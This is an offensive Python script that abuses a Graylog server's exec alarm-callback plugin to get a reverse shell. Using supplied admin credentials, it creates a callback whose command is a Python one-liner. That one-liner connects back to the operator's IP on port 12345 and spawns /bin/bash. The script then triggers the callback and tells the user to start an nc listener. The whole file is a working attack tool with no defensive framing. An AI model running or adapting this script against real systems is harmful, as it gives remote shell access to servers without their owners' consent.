#!/usr/bin/env python3

# Graylog Create Alarm Callback to Obtain Reverse Shell

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import colorama
import getpass
import logging
import requests
import urllib3
from colorama import Fore, Style

colorama.init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# %%%%%%%%%%% Constants %%%%%%%%%%%#

SEPARATOR = "[*] {0} [*]".format('=' * 110)

# %%%%%%%%%% Functions %%%%%%%%%#

def alarm_callback(graylogip):

	graylogpass = getpass.getpass(
		Fore.CYAN + Style.BRIGHT + "[!] Enter Graylog Admin Password: " + Style.RESET_ALL)

	localIP = input("[!] Enter your local IP address: ")
	alertid = "000000000000000000000000"
	authurl = "http://" + graylogip + ":9000/api/system/sessions"
	typesurl = "http://" + graylogip + ":9000/api/alerts/callbacks/types"
	alarmsurl = "http://" + graylogip + ":9000/api/streams/000000000000000000000001/alarmcallbacks"

	bashcommand = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET," \
	"socket.SOCK_STREAM);s.connect((\"" + localIP + "\",12345));os.dup2(s.fileno()," \
	"0); os.dup2(s.fileno()," \
	"1); os.dup2(s.fileno()," \
	"2);import pty; pty.spawn(" \
	"\"/bin/bash\")'"

	params = {
		"title": "testgraylog", "type": "ir.elenoon.ExeCommandAlarmCallBack",
		"configuration": {"bashCommand": bashcommand}
	}
	headers = {'X-Requested-By': 'XMLHttpRequest'}
	authparams = {'username': 'admin', 'password': graylogpass, 'host': graylogip}

	print(SEPARATOR)
	print("[!] Start a listener in port 12345, for example nc -lvp 12345")

	try:
		s = requests.Session()
		s.headers.update(headers)
		s.auth = ('admin', graylogpass)
		s.post(authurl, json = authparams, verify = False)

		response = s.get(typesurl, verify = False)

		if (response.status_code == 200 and "ir.elenoon.ExeCommandAlarmCallBack" in
		response.text):  # text of graylog2 plugin exec
			print(SEPARATOR)
			print("[!] Alarm Callback Exec Plugin Found")
			postresponse = s.post(alarmsurl, json = params, verify = False)

			if postresponse.status_code == 201:  # created status code
				print("[!] Alarm Callback Succesfully Created")
				data = postresponse.json()
				alertid = str(data['alarmcallback_id'])

				if (alertid != "000000000000000000000000"):
					print("[!] Alarm Callback ID: " + alertid)
					testurl = "http://" + graylogip + ":9000/api/alerts/callbacks/" + alertid + \
					"/test"
					testresponse = s.post(testurl, verify = False)

					if testresponse.status_code == 200:
						print(
							"[!] Test Action Started: " + Fore.RED + Style.BRIGHT + "Reverse Shell Ready")
						print(Style.RESET_ALL + SEPARATOR)
					else:
						print("[!] Error in Action Test")
				else:
					print("[!] Error in Alarm Callback ID")

			else:
				print("[!] Error in Alarm Callback Creation")

		else:
			print(SEPARATOR)
			print("[!] Alarm Callback Exec Plugin Not Found")

	except Exception as e:
		logging.error(e, exc_info = True)

# %%%%%%%%%% The End %%%%%%%%%%#
